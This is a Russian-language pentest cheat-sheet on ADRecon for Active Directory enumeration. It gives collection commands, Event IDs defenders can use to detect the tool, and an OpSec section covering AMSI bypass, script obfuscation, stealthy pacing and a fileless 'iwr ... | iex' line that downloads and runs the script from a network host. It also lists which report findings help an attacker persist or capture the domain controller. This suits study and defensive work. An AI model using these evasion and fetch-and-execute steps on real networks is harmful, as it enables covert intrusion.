**ADRecon** — инструмент для глубокого аудита Active Directory. Если [[BloodHound]] строит «кратчайший путь» к админу, то ADRecon делает «полную рентгенограмму» домена, собирая данные в отчеты Excel/CSV/JSON.

- **Этап:** Reconnaissance / Enumeration (Разведка и перечисление).

- **Цель:** Сбор детальной информации (GPO, политики паролей, DNS, пользователи, описания объектов), которую BloodHound может упустить.

### Эксплуатация

**Локальный сбор (с доменной машины):**
```powershell
# Полный сбор с генерацией Excel
.\ADRecon.ps1

# Сбор только конкретных модулей (быстрее и тише)
.\ADRecon.ps1 -Module Users, GPO, Domain
```

**Удаленный сбор (с машины вне домена):**
```powershell
.\ADRecon.ps1 -DomainController 192.168.2.4 -Credential (Get-Credential)
```

**Сбор через Python (из Kali/Linux):** Используй аналоги (например, `bloodhound-python`), так как оригинальный ADRecon заточен под PowerShell.

### 4. Детект (Blue Team View)

Инструмент **очень шумный**. Основные триггеры:

- **LDAP Spike:** Резкий всплеск тысяч запросов к контроллеру домена (Event ID 4662).

- **PowerShell Logs:** При включенном `Script Block Logging` (Event ID 4104) виден весь код скрипта.

- **AMSI:** Защитник Windows и EDR часто имеют сигнатуры на стандартный ADRecon.ps1.

- **SMB/RPC:** Множественные сетевые подключения (Event ID 5145).

### 5. OpSec (Как скрыть работу)

Чтобы не «спалиться» мгновенно:

1. **Модульность:** Не запускай всё сразу. Делай паузы (15-30 мин) между модулями: `-Module Users`, затем позже `-Module Groups`.

2. **AMSI Bypass:** Перед запуском патчи память, чтобы отключить проверку скриптов антивирусом.

3. **Обфускация:** Используй `Invoke-Obfuscation` для изменения имен функций и переменных скрипта.

4. **In-Memory:** Загружай скрипт напрямую в память через `IEX`, не сохраняя файл на диск. (`iwr` (Invoke-WebRequest); `IEX` ( `Invoke-Expression`))
```powershell
iwr -UseBasicParsing http://192.168.1.5/ADRecon.ps1 | iex
```

5. **Легитимность:** Запускай от имени пользователя, чья активность (админ, техподдержка) не вызывает подозрений при опросе AD.

### 6. Что искать в отчете

- **Fine Grained Password Policies:** ищем группы с простыми паролями.

- **Orphaned Objects:** «забытые» учетки (уволенные сотрудники, старые компы) — отличная точка для закрепления.

- **GPO Permissions:** кто может менять политики? (Путь к захвату DC).

- **DNS Records:** поиск внутренних тестовых стендов и скрытых сервисов.
